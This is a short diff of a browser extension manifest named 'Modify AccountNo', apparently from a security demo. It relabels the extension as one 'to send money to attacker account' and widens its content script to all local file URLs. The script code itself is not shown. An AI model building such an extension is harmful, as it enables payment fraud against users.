@@ -3,10 +3,11 @@
 
   "name": "Modify AccountNo",
   "version": "0.1.0",
-  "description": "Lateral blog post demo extension",
+  "description": "Extension to send money to attacker account",
 
  "content_scripts": [{
     "js": ["content.js"],
-    "matches": ["file:///home*"]
+    "matches": ["file:///*"]
   }]
 }
+
